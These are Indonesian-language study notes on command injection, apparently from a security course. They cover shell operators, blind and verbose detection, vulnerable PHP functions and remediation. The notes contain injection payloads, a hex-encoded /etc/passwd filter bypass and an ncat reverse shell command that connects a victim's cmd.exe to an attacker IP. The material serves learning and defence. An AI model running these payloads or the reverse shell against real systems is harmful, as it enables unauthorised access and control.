```
=== Command Injection - Resume Materi ===
[17 Mar 2026]

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 APA ITU COMMAND INJECTION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Definisi : Penyalahgunaan perilaku aplikasi untuk mengeksekusi
           perintah pada OS menggunakan privilege aplikasi itu sendiri
Alias    : Remote Code Execution (RCE)
Kenapa   : Aplikasi meneruskan input user langsung ke sistem OS
           tanpa filtering → OS menjalankannya mentah-mentah
Bahaya   : Baca file sensitif, ambil data, buka reverse shell,
           eskalasi privilege
Fakta    : Masuk OWASP Top 10 & Contrast Security AppSec 2019

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 MENGAPA BISA TERJADI
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Penyebab : Bahasa seperti PHP, Python, NodeJS punya fungsi
           yang bisa membuat system call ke OS
           → Input user langsung dimasukkan ke perintah OS
           → Tanpa validasi = celah terbuka
Berlaku  : Di semua bahasa pemrograman, bukan hanya PHP
Contoh   : grep $title /var/www/html/songtitle.txt
           → $title diisi user → bisa diisi perintah jahat

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 DUA TIPE COMMAND INJECTION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Blind   → Tidak ada output langsung di halaman
          Harus deteksi lewat perilaku aplikasi
          Cara deteksi :
          - Time delay  : ping / sleep → aplikasi hang
          - Force output: redirect > ke file → baca pakai cat
          Catatan : Rumit, butuh eksperimen, sintaks beda
                    antara Linux & Windows

Verbose → Ada output langsung di halaman ← LEBIH MUDAH
          Hasil perintah langsung tampil di web
          Contoh : whoami → langsung tampil nama user

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 SHELL OPERATORS (WAJIB HAPAL)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
;   → Semicolon   : Jalankan cmd1 SELESAI dulu, baru cmd2
                    Tidak ada syarat, selalu jalan keduanya
                    Output : cmd1 dulu → cmd2 setelahnya

&&  → AND         : Jalankan cmd1, cmd2 HANYA jika cmd1 sukses
                    Ada syarat keberhasilan cmd1
                    Output : cmd1 dulu → cmd2 setelahnya

|   → Pipe        : Jalankan cmd1 & cmd2 PARALEL/bersamaan
                    Output cmd1 → diteruskan sebagai input cmd2
                    Jika cmd2 punya argumen sendiri → abaikan cmd1
                    Output : hanya cmd2 yang tampil (lebih cepat)

Contoh penggunaan :
  127.0.0.1; whoami          → ping selesai dulu, baru whoami
  127.0.0.1 && whoami        → whoami jalan hanya jika ping sukses
  127.0.0.1 | whoami         → langsung whoami, ping diabaikan

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 USEFUL PAYLOADS - LINUX
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
whoami  → Lihat user yang menjalankan aplikasi
ls      → List isi direktori (config files, env files, keys)
ping    → Buat aplikasi hang → test blind injection
sleep   → Alternatif ping jika ping tidak terinstall
          → test blind injection
nc      → Netcat → buka reverse shell ke aplikasi vulnerable
          → navigasi target, eskalasi privilege

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 USEFUL PAYLOADS - WINDOWS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
whoami  → Lihat user yang menjalankan aplikasi
dir     → List isi direktori (config files, env files, keys)
ping    → Buat aplikasi hang → test blind injection
timeout → Alternatif ping jika ping tidak terinstall
          → test blind injection

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 VULNERABLE FUNCTIONS PHP
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Exec      → Eksekusi perintah OS, kembalikan output baris terakhir
Passthru  → Eksekusi perintah OS, tampilkan output mentah langsung
System    → Eksekusi perintah OS, tampilkan & kembalikan output

Bahaya : Semua fungsi ini mengeksekusi APAPUN yang diberikan
         Tanpa pengecekan = aplikasi vulnerable

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 CARA MENCEGAH (REMEDIATION)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Hindari Fungsi Berbahaya
   → Minimalkan/hindari Exec, Passthru, System
   → Jika terpaksa pakai, wajib validasi ketat

2. Input Sanitisation
   → Tentukan format/tipe data yang boleh masuk
   → Hapus karakter berbahaya : > & / dll
   → Contoh PHP : filter_input(INPUT_GET, "number",
                  FILTER_VALIDATE_NUMBER)
   → Contoh HTML: pattern="[0-9]+" → hanya angka diterima

3. Waspadai Bypass
   → Filter bisa ditembus dengan encoding
   → Contoh : / diblokir → pakai hex \x2f
   → "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
     = /etc/passwd dalam hexadecimal

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 CURL SEBAGAI TOOL DETEKSI
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Fungsi : Kirim & terima data dari aplikasi dalam payload
Kenapa : Cara bagus untuk test command injection dari luar
Contoh :
curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 REVERSE SHELL VIA COMMAND INJECTION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Alur :
  Penyerang listen dulu :
  ncat -lvp 4444
    -l = listen/tunggu koneksi
    -v = verbose/tampilkan detail
    -p = port yang digunakan

  Korban diperintah connect balik (via injection) :
  ncat 192.168.1.5 4444 -e cmd.exe
    192.168.1.5 = IP penyerang
    4444        = port tujuan
    -e cmd.exe  = hubungkan cmd.exe ke koneksi ini

Hasil : Penyerang dapat shell langsung ke sistem korban
        Berjalan dengan privilege user aplikasi (misal www-data)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ISTILAH PENTING YANG WAJIB HAPAL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Command Injection  = eksekusi perintah OS lewat input aplikasi
RCE                = Remote Code Execution, alias command injection
System Call        = pemanggilan fungsi OS dari dalam program
Shell Operator     = karakter penggabung perintah (; && |)
Payload            = perintah/input yang disuntikkan penyerang
Blind Injection    = injection tanpa output langsung di halaman
Verbose Injection  = injection dengan output langsung di halaman
Input Sanitisation = proses validasi & pembersihan input user
Hex Encoding       = representasi karakter dalam format heksadesimal
                     dipakai untuk bypass filter karakter
www-data           = user default web server Apache/Nginx di Linux
                     privilege terbatas, bukan root
Reverse Shell      = koneksi dari korban ke penyerang
                     penyerang dapat kendali terminal korban
filter_input()     = fungsi PHP untuk validasi tipe data input
pattern="[0-9]+"   = HTML attribute → hanya terima angka 0-9
```